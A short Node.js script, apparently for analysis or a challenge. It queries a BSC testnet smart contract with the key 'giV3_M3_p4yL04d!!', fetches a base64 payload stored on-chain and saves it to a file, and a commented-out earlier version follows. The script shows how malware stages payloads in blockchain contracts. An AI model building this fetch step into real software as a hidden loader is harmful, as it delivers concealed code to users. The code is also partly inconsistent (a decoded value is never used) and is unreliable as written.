process.removeAllListeners('warning');
const { Web3 } = require('web3');
const fs = require("fs");
const web3 = new Web3("https://bsc-testnet.public.blastapi.io");
const contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";
async function callContractFunction(inputString) {
  try {
    const methodId = "0x5684cff5";
    const encodedData = methodId + web3.eth.abi.encodeParameters(["string"], [inputString]).slice(2);
    const result = await web3.eth.call({to: contractAddress, data: encodedData});
    const largeString = web3.eth.abi.decodeParameter("address", result);
    console.log("Address:" , largeString);
    const targetAddress = Buffer.from(largeString).toString("utf-8");
    //const targetAddress = "0x53387F3321FD69d1E030BB921230dFb188826AFF"; 
    console.log("targetAddress:" , targetAddress);
    const filePath = "decoded_output.txt";
    fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
    const new_methodId = "0x5c880fcb"; // 0x5c880fcb
    const blockNumber = 43152015;
    const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
    console.log("Calling the function");
    const newData = await web3.eth.call({to: contractAddress, data: newEncodedData}, blockNumber);
    console.log("Result:", newData);
    const decodedData = web3.eth.abi.decodeParameter("string", newData);
    const base64DecodedData = Buffer.from(decodedData, "base64").toString("utf-8");
    fs.writeFileSync(filePath, decodedData);
    console.log(`Saved decoded data to:${filePath}`);
  } catch (error) {
    console.error("Error calling contract function:", error);
  }
}
const inputString = "giV3_M3_p4yL04d!!";
callContractFunction(inputString);



// const { Web3 } = require('web3');
// const fs = require("fs");
// const web3 = new Web3("https://data-seed-prebsc-1-s1.binance.org:8545/");
// const contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";
// async function callContractFunction(inputString) {
//     try {
//         const methodId = "0x5684cff5";
//         const encodedData = methodId + web3.eth.abi.encodeParameters(["string"], [inputString]).slice(2);
//         const result = await web3.eth.call({
//             to: contractAddress,
//             data: encodedData
//         });
//         console.log(result)
//         const largeString = web3.eth.abi.decodeParameter("string", result);
//         const targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
//         const filePath = "decoded_output.txt";
//         fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
//         const new_methodId = "0x5c880fcb";
//         const blockNumber = 43152014;
//         const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
//         const newData = await web3.eth.call({
//             to: contractAddress,
//             data: newEncodedData
//         }, blockNumber);
//         const decodedData = web3.eth.abi.decodeParameter("string", newData);
//         const base64DecodedData = Buffer.from(decodedData, "base64").toString("utf-8");
//         fs.writeFileSync(filePath, decodedData);
//         console.log(`Saved decoded data to: $ {
//             filePath
//         }`)
//     } catch (error) {
//         console.error("Error calling contract function:", error)
//     }
// }
// const inputString = "giV3_M3_p4yL04d!!";
// callContractFunction(inputString);
